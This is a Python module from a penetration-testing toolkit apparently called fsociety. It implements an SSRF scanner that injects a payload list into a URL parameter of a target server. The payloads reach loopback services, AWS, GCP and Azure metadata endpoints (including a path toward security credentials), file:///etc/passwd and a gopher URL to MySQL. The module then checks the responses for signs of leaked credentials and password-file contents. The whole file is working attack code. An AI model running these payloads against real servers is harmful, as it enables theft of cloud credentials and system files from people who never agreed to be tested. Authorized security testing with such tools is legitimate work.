from __future__ import annotations
import http.client
import json
import re
import ssl
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

from fsociety.core.base import tool
from fsociety.core.logger import Log

SSRF_PAYLOADS = [
    "http://127.0.0.1:80",
    "http://127.0.0.1:22",
    "http://localhost:8080",
    "http://169.254.169.254/latest/meta-data/", # AWS
    "http://metadata.google.internal/computeMetadata/v1/", # GCP
    "http://169.254.169.254/metadata/instance?api-version=2017-08-01", # Azure
    "file:///etc/passwd",
    "gopher://127.0.0.1:3306/_test",
]

MARKERS = {
    "AWS": ["ami-id", "instance-id", "security-credentials"],
    "GCP": ["project", "instance", "service-accounts"],
    "Azure": ["compute", "network", "vmId"],
    "Internal": ["SSH-2.0", "root:x:0:0:", "localhost", "127.0.0.1"]
}

@tool("ssrf", "Server-Side Request Forgery scanner (Cloud metadata & Internal)", category="web")
class SSRFScanner:
    @staticmethod
    def build_parser(p):
        p.add_argument("url", help="Target URL (e.g. http://site/load?url=test)")
        p.add_argument("--param", required=True, help="Parameter to inject")
        p.add_argument("--timeout", type=float, default=8.0)
        p.add_argument("--insecure", action="store_true")

    @staticmethod
    def _ctx(insecure: bool):
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        return ctx

    @staticmethod
    def _request(url, param, payload, timeout, ctx):
        parsed = urllib.parse.urlparse(url)
        scheme = parsed.scheme or "http"
        host = parsed.hostname
        port = parsed.port or (443 if scheme == "https" else 80)
        path = parsed.path or "/"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        query = urllib.parse.urlencode(qs, doseq=True)
        
        conn = (http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx) if scheme == "https" else http.client.HTTPConnection(host, port, timeout=timeout))
        try:
            conn.request("GET", f"{path}?{query}", headers=headers)
            resp = conn.getresponse()
            body = resp.read(8192).decode("utf-8", "ignore")
            return resp.status, body
        except Exception as exc:
            return None, str(exc)
        finally:
            conn.close()

    @staticmethod
    def run(args, log: Log) -> int:
        ctx = SSRFScanner._ctx(args.insecure)
        log.info(f"Testing SSRF on {args.url} (Param: {args.param})")
        
        found = False
        for payload in SSRF_PAYLOADS:
            status, body = SSRFScanner._request(args.url, args.param, payload, args.timeout, ctx)
            
            if status is None:
                continue

            for provider, sigs in MARKERS.items():
                if any(sig in body for sig in sigs):
                    log.hit(f"SSRF Confirmed via {provider}!")
                    log.hit(f"Payload: {payload}")
                    log.hit(f"Evidence: Found '{sigs[0]}' in response.")
                    found = True
                    break
                    
            if status == 200 and "connection refused" not in body.lower() and payload.startswith("file://"):
                log.hit(f"Potential Local File Inclusion via SSRF: {payload}")
                found = True

        if not found:
            log.info("No SSRF vulnerabilities detected.")
        return 0 if found else 1
